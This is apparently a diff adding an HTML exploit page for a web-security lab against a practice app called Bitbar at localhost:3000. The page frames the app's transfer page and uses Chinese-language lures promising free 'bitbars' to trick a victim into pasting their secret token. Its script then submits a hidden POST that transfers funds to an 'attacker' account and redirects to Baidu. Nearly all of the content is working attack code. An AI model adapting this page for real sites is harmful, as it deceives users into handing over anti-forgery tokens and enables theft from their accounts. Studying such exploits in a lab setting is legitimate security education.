@@ -1,0 +1,67 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Bitbar Secure Transfer — Verification</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;padding:1.5rem}
+    .box{max-width:900px;margin:0 auto}
+    .panel{border:1px solid #ddd;padding:1rem;border-radius:6px;margin-bottom:1rem}
+    .iframe-wrap{height:260px;border:1px solid #ccc;overflow:hidden}
+    iframe{width:100%;height:100%;border:0}
+    label.show{display:block;margin:0.5rem 0;font-weight:bold}
+    .hint{color:#555}
+    .actions{margin-top:1rem}
+    button.primary{background:#007bff;color:#fff;border:0;padding:0.5rem 1rem;border-radius:4px}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Secure Transfer Confirmation</h2>
+    <div class="panel">
+      <p class="hint">提示：系统已在后台为你生成一段临时的 <strong>Secret Token</strong>，请在下方操作中按照指示把该 token 复制并粘贴到输入框里，然后点击“确认”。 便可领取一些免费的 <strong>bitbars</strong>。</p>
+    </div>
+
+    <div class="panel">
+      <h4>Step 1 — 查看 Secret Token</h4>
+      <p class="hint">下面的区域展示了“安全转账”页面（来自 Bitbar）；请直接在其中查找标为 <strong>Super Secret Token</strong> 的那一行，复制该 token。</p>
+      <div class="iframe-wrap">
+        <iframe id="victim_frame" src="http://localhost:3000/super_secure_transfer" title="secure"></iframe>
+      </div>
+    </div>
+
+    <div class="panel">
+      <h4>Step 2 — 粘贴并确认</h4>
+      <label class="show">Paste the Secret Token you saw above:</label>
+      <input id="token_input" type="text" style="width:100%;padding:0.5rem;font-size:1rem" placeholder="粘贴 token 到此处" />
+      <div class="actions">
+        <button id="confirm" class="primary">确认即可获得免费bitbars</button>
+      </div>
+      <p class="hint">操作完成后页面将跳转至百度。</p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('confirm').addEventListener('click', function(){
+      var tok = document.getElementById('token_input').value.trim();
+      if(!tok){ alert('请先从上方页面复制 Secret Token 并粘贴到输入框。'); return; }
+
+      // 构造表单并提交到 super_secure_post_transfer
+      var form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'http://localhost:3000/super_secure_post_transfer';
+
+      function add(name, val){ var i = document.createElement('input'); i.type='hidden'; i.name=name; i.value=val; form.appendChild(i); }
+      add('destination_username','attacker');
+      add('quantity','10');
+      add('tokeninput', tok);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      // 给服务器 1s 时间处理，然后重定向到百度
+      setTimeout(function(){ window.location = 'https://www.baidu.com/'; }, 1000);
+    });
+  </script>
+</body>
+</html>
